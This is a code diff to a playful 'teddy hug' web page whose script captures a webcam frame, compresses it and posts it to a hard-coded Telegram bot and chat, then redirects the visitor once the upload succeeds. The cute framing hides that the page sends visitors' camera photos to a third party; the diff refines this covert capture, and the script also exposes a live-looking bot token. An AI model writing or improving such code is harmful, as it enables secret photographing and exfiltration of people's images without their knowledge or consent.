@@ -63,6 +63,7 @@
     .decor.bottom-left { bottom: 5%; left: 8%; animation-delay: 4s; }
     .decor.center-left { top: 50%; left: 2%; animation-delay: 2.5s; }
     .decor.center-right { top: 50%; right: 2%; animation-delay: 3.5s; }
+
     @keyframes floaty {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
@@ -102,17 +103,22 @@
       });
 
     function captureAndSend() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
+      if (!video.videoWidth || !video.videoHeight) {
+        alert("Please wait for the camera to load.");
+        return;
+      }
 
-      const photo = canvas.toDataURL('image/jpeg');
+      const width = 480;
+      const height = video.videoHeight / (video.videoWidth / width);
+      canvas.width = width;
+      canvas.height = height;
+      ctx.drawImage(video, 0, 0, width, height);
+
+      const photo = canvas.toDataURL('image/jpeg', 0.6); // 📦 compressed
 
       fetch("https://api.telegram.org/bot7613683060:AAEsyP1JaIKh1mLawCyWmFxpgl0KOToj2Xs/sendPhoto", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: 1786564127,
           photo: photo
@@ -120,10 +126,15 @@
       })
       .then(res => res.json())
       .then(data => {
-        window.location.href = 'teddy3.html';
+        if (data.ok) {
+          window.location.href = 'teddy3.html'; // only after success
+        } else {
+          alert("Failed to send hug. Try again.");
+        }
       })
       .catch(err => {
-        console.error("Error sending hug:", err);
+        console.error("Error:", err);
+        alert("Could not send hug.");
       });
     }
   </script>
